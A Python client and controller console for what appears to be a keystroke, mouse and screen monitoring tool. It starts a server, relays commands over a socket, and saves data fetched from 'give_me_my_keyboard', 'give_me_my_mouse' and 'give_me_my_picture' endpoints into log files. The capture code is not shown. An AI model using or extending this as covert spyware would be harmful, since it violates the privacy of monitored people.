from app._client import Client_socket as csock
from app.functions import redirect_output
import asyncio, subprocess, time, queue, threading, requests, os, datetime

URLl = 'http://localhost:3000/give_me_my_data'
threads_done = threading.Event()

def update_log():
    """ Update log file """
    log_directory = "./log"
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)
        
    now = datetime.datetime.now()
    format_date = str(now.strftime("%d_%m_%Y"))
    
    print("update log...")
    print("generate keyboard log...")
    time.sleep(1)
    response_keyboard = requests.get("http://localhost:3000/give_me_my_keyboard")
    with open("./log/log_keyboard_{}.log".format(str(format_date)), "a") as file:
        file.write(str(response_keyboard.content)+"\n")
        print(str(response_keyboard.content)+"\n")
        
    time.sleep(1)    
    print("generate mouse log...")
    response_mouse = requests.get("http://localhost:3000/give_me_my_mouse")
    with open("./log/log_mouse_{}.log".format(str(format_date)), "a") as file:
        file.write(str(response_mouse.content)+"\n")
        print(str(response_mouse.content)+"\n")
        
    time.sleep(1)    
    print("generate picture log...")
    response_picture = requests.get("http://localhost:3000/give_me_my_picture")
    with open("./log/log_picture_{}.log".format(str(format_date)), "a") as file:
        file.write(str(response_picture.content)+"\n")
        print(str(response_picture.content)+"\n")
    time.sleep(1)    
    
def show_files():
    """ Show files in log folder """
    try:
        pathl = "./log"
        contenu_dossier = os.listdir(pathl)
        files = [f for f in contenu_dossier if os.path.isfile(os.path.join(pathl, f))]
    
        print("---- :", files)
    except:
        print("\n[!] - Log folder is empty\n")
        
def read_file(filename):
    """ Read file """
    
    try:
        with open("./log/{}".format(filename), "r") as file:
            print(file.read())
    except:
        print("Can't read file {}".format(filename))
class client:
    """ Main client class """
    

    async def ainit(self, force = False) -> None:
        """ Init client """
        self.force = force
        try:
            
            if threads_done.is_set():pass # If the thread is already running, do nothing
            elif not threads_done.is_set(): threads_done.set() # Set the thread as running

            #Controler => (Init & Server_socket & capture)
            server_output_queue = queue.Queue()
            server = self.run_server()
            server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
            server_output_thread.start()

            
            #CLIENT SOCKET
            generate_csock = csock()
            if not await generate_csock.ainit(): raise Exception()
            
            
            print('\n---- [ONLY ON SERVER - SHOW (show log files) - READ_FILE [FILENAME] (read file) - INTERPT_LOG ] ----\n')
            print("> Server started is running now: Press 'help' for more information\n") 
           
            while True:
                while True:
                    if subprocess.Popen.poll(server) != None:# Forced restart if the server is closed by ? entity
                        server_output_queue = queue.Queue()
                        server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
                        server_output_thread.start()
                    elif subprocess.Popen.poll(server) == None:
                        if not server_output_queue.empty(): # Check if the server has sent any output
                            line = server_output_queue.get()
                            if not line:# If the server has closed reset the queue and thread
                                server_output_queue = queue.Queue()
                                server_output_thread = threading.Thread(target=redirect_output, args=(server.stdout, server_output_queue))
                                server_output_thread.start()
                            else:
                                print(line)
                                line = None
                        else:break
                inpt = input("> Press enter to send a message\n\n--").upper()
                read_files = inpt.split(' ')
                if "show".upper() in inpt: 
                    show_files()
                elif "read_file".upper() == read_files[0]: #prendre un fichier en compte
                    print("Read file")
                    read_file(read_files[1])
                elif "interpt_log".upper() in inpt:update_log()
                elif inpt == "stop":break
                else:
                    await generate_csock.send(message=inpt)
                    print("\n---------------------\n")
            
        except: 
            time.sleep(5)
            return await self.ainit()
        finally: 
            print("Client restarted")
    
    def run_server(self):
        """ Run server on subprocess """
        
        arguments = ["python", "-u", "m_server.py", f"URLl={URLl}"]
        
        server_socket = subprocess.Popen(
            arguments,
            stdout=subprocess.PIPE,  # Capture output
            bufsize=1,  # Line-buffered
            universal_newlines=True,  # Translate to UTF-8
            shell=False  # No shell injection risk
        )
        return server_socket
    
if __name__ == "__main__":
    # update_log()
    asyncio.run(client().ainit())
    
    
#ne pas oublier de changer dans send le port de send et de receive car ici on est en local